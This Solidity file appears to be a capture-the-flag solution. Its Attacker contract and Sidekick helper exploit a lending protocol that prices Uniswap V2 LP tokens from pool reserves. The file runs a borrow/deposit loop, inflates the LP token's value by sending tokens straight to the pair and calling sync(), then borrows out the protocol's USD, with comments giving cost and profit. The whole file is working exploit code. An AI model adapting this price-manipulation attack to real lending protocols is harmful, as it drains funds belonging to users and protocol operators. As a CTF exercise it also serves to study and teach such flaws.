// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { ERC20 } from "./ERC20.sol";
import { IUniswapV2Pair } from "./IUniswapV2.sol";
import { LendingProtocol } from "./LendingProtocol.sol";

/// @title Attacker
/// @author Christoph Michel <cmichel.io>
contract Attacker {
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    ERC20 public immutable ctf; // token0
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;

    Sidekick public immutable sidekick;

    constructor(
        ERC20 _ctf,
        ERC20 _usd,
        IUniswapV2Pair _pair,
        LendingProtocol _lending
    ) {
        ctf = _ctf;
        usd = _usd;
        pair = _pair;
        lending = _lending;

        sidekick = new Sidekick(_usd, _lending);
    }

    function attack() external {
        // add minimal liquidity needed to create a borrow/deposit loop
        // we don't want it to be to big to remain low overall liquidity
        ctf.transfer(address(pair), 1 * 1e17);
        usd.transfer(address(pair), 100 * 1e18);
        uint256 liquidity = pair.mint(address(this)); // liquidity worth ~200$

        // deposit 9800$ worth of assets to create collateral for the attacker
        usd.approve(address(lending), type(uint256).max);
        ctf.approve(address(lending), type(uint256).max);
        lending.deposit(address(this), address(usd), 4900 * 1e18);
        lending.deposit(address(this), address(ctf), 49 * 1e17);

        // a borrow/deposit loop to create ~10k$ collateral value for attacker sidekick
        pair.approve(address(lending), type(uint256).max);
        lending.deposit(address(sidekick), address(pair), liquidity);

        for (uint256 i = 0; i < 49; i++) {
            lending.borrow(address(pair), liquidity);
            lending.deposit(address(sidekick), address(pair), liquidity);
        }

        // manipulate pair token value by adding tokens to LP contract directly
        // multiple attacker helper collaterals to ~55k$
        ctf.transfer(address(pair), 5 * 1e18);
        usd.transfer(address(pair), 5000 * 1e18);
        pair.sync();

        // borrow all USD from the lending protocol
        // cost of the attack is 5100$ + 10k$ in CFT tokens
        // profit 34900$
        sidekick.borrow(54900 * 1e18);
    }
}

contract Sidekick {
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;

    constructor(ERC20 _usd, LendingProtocol _lending) {
        usd = _usd;
        lending = _lending;
    }

    function borrow(uint256 _amount) external {
        // borrow USD and transfer back to the attacker
        lending.borrow(address(usd), _amount);
        usd.transfer(msg.sender, _amount);
    }
}
